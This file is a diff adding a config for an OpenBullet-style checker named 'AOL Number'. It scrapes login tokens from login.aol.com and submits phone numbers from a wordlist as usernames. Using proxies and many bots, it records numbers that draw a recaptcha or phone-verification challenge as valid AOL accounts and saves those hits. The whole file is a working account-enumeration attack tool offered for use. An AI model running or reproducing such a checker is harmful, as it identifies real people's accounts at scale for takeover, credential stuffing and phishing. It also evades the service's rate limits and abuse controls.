@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "AOL Number",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-13T21:29:05.9082191+04:30",
+  "AdditionalInfo": "Credit: HOSEEN(@HOSEENJ)|@CommunityHubs",
+  "RequiredPlugins": [],
+  "Author": "HOSEEN",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": true,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Numeric",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Enter country abbreviation",
+      "VariableName": "Country",
+      "Id": 1774127985
+    }
+  ],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://login.aol.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+
+PARSE "<SOURCE>" LR "acrumb\" value=\"" "\"" -> VAR "Acrumb" 
+
+PARSE "<SOURCE>" LR "sessionIndex\" value=\"" "\"" -> VAR "SessionIndex" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "<Acrumb>" Exists 
+    KEY "<SessionIndex>" Exists 
+
+REQUEST POST "https://login.aol.com/" AutoRedirect=FALSE 
+  CONTENT "crumb=&acrumb=<Acrumb>&sessionIndex=<SessionIndex>&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Afalse%7D%7D&countryCodeIntl=<Country>&username=<CODE>&passwd=&signin=Next" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: login.aol.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://login.aol.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://login.aol.com" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"location\":\"/account/challenge/recaptcha" 
+    KEY "\"location\":\"/account/challenge/phone-verify" 
+  KEYCHAIN Failure OR 
+    KEY "\"error\":\"messages.INVALID_PHONE_NUMBER\"" 
+    KEY "\"error\":\"messages.INVALID_IDENTIFIER\"" 
+
+FUNCTION Constant "<Country>" -> CAP "Country" 
+
